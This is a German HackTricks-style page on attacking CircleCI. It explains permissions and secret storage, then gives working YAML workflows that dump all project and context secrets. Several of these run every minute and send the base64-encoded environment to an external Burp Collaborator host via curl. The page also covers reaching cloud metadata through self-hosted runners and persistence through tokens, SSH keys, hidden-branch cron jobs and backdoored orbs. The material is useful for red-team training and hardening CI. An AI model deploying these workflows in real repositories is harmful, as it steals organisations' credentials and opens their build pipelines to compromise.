# CircleCI Sicherheit

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## Grundlegende Informationen

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) ist eine Continuous Integration-Plattform, auf der Sie **Vorlagen definieren** k√∂nnen, die angeben, was Sie mit etwas Code tun m√∂chten und wann. Auf diese Weise k√∂nnen Sie z. B. **Tests automatisieren** oder **Bereitstellungen** direkt **von Ihrem Repo-Masterzweig aus** durchf√ºhren.

## Berechtigungen

**CircleCI** **erbt die Berechtigungen** von GitHub und Bitbucket in Bezug auf das **Konto**, das sich anmeldet.\
In meinen Tests habe ich festgestellt, dass Sie, solange Sie **Schreibberechtigungen f√ºr das Repo in GitHub haben**, in der Lage sein werden, **dessen Projekteinstellungen in CircleCI zu verwalten** (neue SSH-Schl√ºssel festlegen, Projekt-API-Schl√ºssel abrufen, neue Zweige mit neuen CircleCI-Konfigurationen erstellen...).

Sie m√ºssen jedoch ein **Repo-Administrator** sein, um das Repo in ein CircleCI-Projekt umzuwandeln.

## Umgebungsvariablen & Secrets

Gem√§√ü [**der Dokumentation**](https://circleci.com/docs/2.0/env-vars/) gibt es verschiedene M√∂glichkeiten, **Werte in Umgebungsvariablen** innerhalb eines Workflows zu **laden**.

### Eingebaute Umgebungsvariablen

Jeder von CircleCI ausgef√ºhrte Container wird immer [**spezifische Umgebungsvariablen haben, die in der Dokumentation definiert sind**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) wie `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` oder `CIRCLE_USERNAME`.

### Klartext

Sie k√∂nnen sie im Klartext innerhalb eines **Befehls** deklarieren:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
Sie k√∂nnen sie im Klartext in der **Ausf√ºhrungsumgebung** deklarieren:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
Sie k√∂nnen sie im Klartext in der **build-job Umgebung** deklarieren:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
Du kannst sie im Klartext innerhalb der **Umgebung eines Containers** deklarieren:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### Projektgeheimnisse

Dies sind **Geheimnisse**, die nur vom **Projekt** (von **jedem Branch**) **zug√§nglich** sind.\
Sie k√∂nnen sie **deklariert sehen unter** _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
Die "**Importieren von Variablen**"-Funktionalit√§t erm√∂glicht es, **Variablen aus anderen Projekten** in dieses zu **importieren**.
{% endhint %}

### Kontextgeheimnisse

Dies sind Geheimnisse, die **org-weit** sind. Standardm√§√üig kann **jedes Repository** hier gespeicherte Geheimnisse **zugreifen**:

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
Es ist jedoch zu beachten, dass eine andere Gruppe (anstelle von Allen Mitgliedern) ausgew√§hlt werden kann, um den Zugriff auf die Geheimnisse nur bestimmten Personen zu erm√∂glichen.\
Dies ist derzeit einer der besten Wege, um die Sicherheit der Geheimnisse zu erh√∂hen, um nicht jedem den Zugriff zu erm√∂glichen, sondern nur einigen Personen.
{% endhint %}

## Angriffe

### Suche nach Klartextgeheimnissen

Wenn Sie **Zugriff auf das VCS** (wie github) haben, √ºberpr√ºfen Sie die Datei `.circleci/config.yml` von **jedem Repository auf jedem Branch** und **suchen** nach potenziellen im Klartext gespeicherten Geheimnissen.

### Geheime Env-Variablen & Kontextenumeration

Durch √úberpr√ºfen des Codes k√∂nnen Sie **alle Geheimnisnamen** finden, die in jeder `.circleci/config.yml`-Datei verwendet werden. Sie k√∂nnen auch die **Kontextnamen** aus diesen Dateien erhalten oder sie in der Webkonsole √ºberpr√ºfen: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

### Projektgeheimnisse exfiltrieren

{% hint style="warning" %}
Um **ALLE** Projekt- und Kontext-**GEHEIMNISSE** zu **exfiltrieren**, ben√∂tigen Sie nur **SCHREIBZUGRIFF** auf **nur 1 Repository** in der gesamten github-Organisation (_und Ihr Konto muss Zugriff auf die Kontexte haben, aber standardm√§√üig kann jeder auf jeden Kontext zugreifen_).
{% endhint %}

{% hint style="danger" %}
Die "**Importieren von Variablen**"-Funktionalit√§t erm√∂glicht es, **Variablen aus anderen Projekten** in dieses zu **importieren**. Daher k√∂nnte ein Angreifer **alle Projektvariablen aus allen Repos** importieren und dann **alle zusammen exfiltrieren**.
{% endhint %}

Alle Projektgeheimnisse sind immer in der Umgebung der Jobs festgelegt, sodass das Aufrufen von env und die Verschleierung in base64 die Geheimnisse im **Workflows-Web-Log-Konsole** exfiltrieren wird:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
Wenn Sie **keinen Zugriff auf die Webkonsole haben**, aber **Zugriff auf das Repository** und wissen, dass CircleCI verwendet wird, k√∂nnen Sie einfach **einen Workflow erstellen**, der **alle Minute ausgel√∂st wird** und die Geheimnisse an eine externe Adresse **exfiltriert**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### Kontextgeheimnisse exfiltrieren

Sie m√ºssen den **Kontextnamen angeben** (dadurch werden auch die Projektgeheimnisse exfiltriert):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
Wenn Sie **keinen Zugriff auf die Webkonsole** haben, aber **Zugriff auf das Repository** und wissen, dass CircleCI verwendet wird, k√∂nnen Sie einfach **einen Workflow √§ndern**, der **alle Minute ausgel√∂st wird** und die Geheimnisse an eine externe Adresse **exfiltriert**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Das Erstellen einer neuen `.circleci/config.yml` in einem Repository **reicht nicht aus, um einen CircleCI-Build auszul√∂sen**. Sie m√ºssen es **als Projekt in der CircleCI-Konsole aktivieren**.
{% endhint %}

### Escape to Cloud

**CircleCI** bietet Ihnen die M√∂glichkeit, **Ihre Builds auf ihren Maschinen oder auf Ihren eigenen** auszuf√ºhren.\
Standardm√§√üig befinden sich ihre Maschinen in GCP, und anfangs werden Sie nichts Relevantes finden. Wenn jedoch ein Opfer die Aufgaben in **ihren eigenen Maschinen (m√∂glicherweise in einer Cloud-Umgebung)** ausf√ºhrt, k√∂nnten Sie einen **Cloud-Metadaten-Endpunkt mit interessanten Informationen darauf finden**.

Beachten Sie, dass in den vorherigen Beispielen alles innerhalb eines Docker-Containers gestartet wurde, aber Sie k√∂nnen auch **anfordern, eine VM-Maschine zu starten** (die m√∂glicherweise √ºber unterschiedliche Cloud-Berechtigungen verf√ºgt):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
Oder sogar ein Docker-Container mit Zugriff auf einen entfernten Docker-Dienst:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### Persistenz

* Es ist m√∂glich, **Benutzertoken in CircleCI zu erstellen**, um auf die API-Endpunkte mit den Benutzerberechtigungen zuzugreifen.
* _https://app.circleci.com/settings/user/tokens_
* Es ist m√∂glich, **Projekt-Token zu erstellen**, um auf das Projekt mit den dem Token zugewiesenen Berechtigungen zuzugreifen.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* Es ist m√∂glich, **SSH-Schl√ºssel zu den Projekten hinzuzuf√ºgen**.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* Es ist m√∂glich, **einen Cron-Job in einem versteckten Branch** in einem unerwarteten Projekt zu erstellen, der t√§glich alle **Umgebungsvariablen des Kontexts preisgibt**.
* Oder sogar in einem Branch erstellen / einen bekannten Job √§ndern, der t√§glich alle Kontext- und **Projektgeheimnisse preisgibt**.
* Wenn Sie ein GitHub-Besitzer sind, k√∂nnen Sie **nicht verifizierte Orbs zulassen** und einen als **Hintert√ºr** in einem Job konfigurieren.
* Sie k√∂nnen eine **Befehlsinjektionsl√ºcke** in einer Aufgabe finden und Befehle √ºber ein **Geheimnis** einf√ºgen, indem Sie dessen Wert √§ndern.
